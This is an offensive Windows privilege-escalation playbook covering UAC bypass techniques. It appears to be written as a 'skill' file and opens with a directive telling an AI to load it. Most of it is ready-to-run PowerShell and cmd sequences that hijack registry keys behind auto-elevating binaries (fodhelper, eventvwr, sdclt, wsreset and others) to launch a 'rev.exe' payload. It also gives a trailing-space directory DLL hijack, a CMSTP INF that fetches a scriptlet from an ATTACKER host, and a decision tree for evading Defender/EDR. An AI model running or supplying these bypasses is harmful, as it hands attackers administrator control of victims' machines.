# UAC Bypass Techniques Matrix

> **AI LOAD INSTRUCTION**: Load this for UAC bypass technique selection, auto-elevate binary abuse, and mock trusted directory tricks. Assumes the main [SKILL.md](./SKILL.md) is already loaded for general Windows privesc flow. UAC bypass takes you from medium integrity → high integrity (local admin).

---

## 1. UAC FUNDAMENTALS

### Integrity Levels

| Level | Token | Access |
|---|---|---|
| **Low** | Restricted | Sandboxed (browser, etc.) |
| **Medium** | Standard user token | Default for admin users with UAC |
| **High** | Elevated admin token | Full local admin (post-UAC-consent) |
| **System** | NT AUTHORITY\SYSTEM | Highest OS-level access |

### UAC Settings (ConsentPromptBehaviorAdmin)

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

| Value | Meaning | Bypass Possible? |
|---|---|---|
| 0 | Elevate without prompting | No bypass needed |
| 1 | Prompt for credentials on secure desktop | Difficult |
| 2 | Prompt for consent on secure desktop | Difficult |
| 3 | Prompt for credentials | Possible |
| 4 | Prompt for consent | Possible |
| **5** | **Prompt for consent for non-Windows binaries (default)** | **Yes — auto-elevate abuse** |

**Key insight**: At the default setting (5), Microsoft-signed binaries with `autoElevate=true` in their manifest run elevated without prompting.

---

## 2. UAC BYPASS TECHNIQUE MATRIX

| # | Technique | Binary Abused | Method | Win10 | Win11 | Detection Risk |
|---|---|---|---|---|---|---|
| 1 | **fodhelper** | `fodhelper.exe` | Registry key hijack | Yes | Patched (recent) | Medium |
| 2 | **eventvwr** | `eventvwr.exe` | Registry `mscfile` shell\open | Yes | Partial | Medium |
| 3 | **computerdefaults** | `computerdefaults.exe` | Registry `ms-settings` delegation | Yes | Partial | Medium |
| 4 | **sdclt** | `sdclt.exe` | App paths + isolation aware | Yes | Partial | Low |
| 5 | **DiskCleanup** | `cleanmgr.exe` / schtask | Environment variable (TEMP path) | Yes | Yes | Low |
| 6 | **Mock Trusted Dir** | Various auto-elevate EXEs | Fake `C:\Windows \System32\` path | Yes | Yes | Low |
| 7 | **CMSTP** | `cmstp.exe` | INF file with command execution | Yes | Yes | Medium |
| 8 | **WSReset** | `wsreset.exe` | Registry `ms-settings` delegation | Yes | Yes | Low |
| 9 | **SilentCleanup** | Scheduled Task | Environment variable DLL hijack | Yes | Partial | Low |

---

## 3. DETAILED BYPASS TECHNIQUES

### 3.1 fodhelper.exe Bypass

`fodhelper.exe` auto-elevates and checks `HKCU:\Software\Classes\ms-settings\Shell\Open\command` before launching.

```powershell
# Set registry key to hijack execution
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start C:\temp\rev.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

# Trigger
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 3.2 eventvwr.exe Bypass

`eventvwr.exe` queries `HKCU:\Software\Classes\mscfile\shell\open\command` first.

```powershell
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd.exe /c C:\temp\rev.exe"

Start-Process "C:\Windows\System32\eventvwr.exe"

Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force
```

### 3.3 computerdefaults.exe Bypass

```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c C:\temp\rev.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

Start-Process "C:\Windows\System32\computerdefaults.exe"

Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### 3.4 sdclt.exe Bypass

```powershell
# sdclt.exe checks App Paths in HKCU
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value "cmd.exe"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "Path" -Value "/c C:\temp\rev.exe"

Start-Process "C:\Windows\System32\sdclt.exe"

Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Recurse -Force
```

### 3.5 DiskCleanup / SilentCleanup Bypass

The SilentCleanup scheduled task runs `cleanmgr.exe` with highest privileges and inherits the user's environment.

```cmd
# Set %TEMP% or %WINDIR% to controlled path
set __COMPAT_LAYER=RunAsInvoker
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\temp\rev.exe &" /f

# Trigger the scheduled task
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

# Cleanup
reg delete "HKCU\Environment" /v "windir" /f
```

### 3.6 Mock Trusted Directory Bypass

Windows path-based trust check has a flaw: trailing spaces in directory names.

```cmd
# Create mock directory (note trailing space in "Windows ")
mkdir "C:\Windows \System32"

# Copy auto-elevate binary to fake path
copy C:\Windows\System32\fodhelper.exe "C:\Windows \System32\fodhelper.exe"

# Place malicious DLL in mock directory (DLL hijacking during auto-elevate)
# The binary loads from its directory first, bypassing real System32
copy C:\temp\propsys.dll "C:\Windows \System32\propsys.dll"

# Execute — auto-elevates (path passes trust check) and loads our DLL
"C:\Windows \System32\fodhelper.exe"
```

### 3.7 CMSTP.exe Bypass

```ini
; Save as evil.inf
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://ATTACKER/sct_payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Updater"
ShortSvcName="Updater"
```

```cmd
# Execute (auto-elevates via COM interface)
cmstp.exe /s /ns C:\temp\evil.inf
```

### 3.8 WSReset.exe Bypass

```powershell
New-Item -Path "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635ber5p5gdqk2gm93\Shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635ber5p5gdqk2gm93\Shell\open\command" -Name "(default)" -Value "cmd.exe /c C:\temp\rev.exe"
New-ItemProperty -Path "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635ber5p5gdqk2gm93\Shell\open\command" -Name "DelegateExecute" -Value "" -Force

Start-Process "C:\Windows\System32\wsreset.exe"
```

---

## 4. UACME TOOL REFERENCE

[UACME](https://github.com/hfiref0x/UACME) implements 70+ bypass methods.

```cmd
# Akagi64.exe <method_number> <command>
Akagi64.exe 23 cmd.exe        & REM Method 23: sdclt bypass
Akagi64.exe 33 cmd.exe        & REM Method 33: fodhelper bypass
Akagi64.exe 34 cmd.exe        & REM Method 34: computerdefaults
Akagi64.exe 61 cmd.exe        & REM Method 61: wsreset bypass
```

---

## 5. UAC BYPASS DECISION TREE

```
Need high integrity from medium integrity?
│
├── Check UAC level
│   ├── ConsentPromptBehaviorAdmin = 0 → no bypass needed
│   └── Default (5) → auto-elevate abuse possible
│
├── Windows 10 (any build)?
│   ├── Try fodhelper (simplest, most reliable)
│   ├── If patched → wsreset or computerdefaults
│   ├── If those fail → mock trusted directory + DLL hijack
│   └── DiskCleanup / SilentCleanup (environment variable)
│
├── Windows 11?
│   ├── wsreset (still works on many builds)
│   ├── Mock trusted directory (reliable)
│   ├── CMSTP (if .inf execution allowed)
│   └── DiskCleanup / SilentCleanup
│
├── Defender/EDR blocking registry writes?
│   ├── Mock trusted directory (no registry needed)
│   └── CMSTP with remote .sct payload
│
└── All auto-elevate bypasses fail?
    ├── Check for vulnerable third-party services (runs elevated)
    ├── Exploit SeImpersonate if available (skip UAC entirely)
    └── Look for scheduled tasks running as admin
```
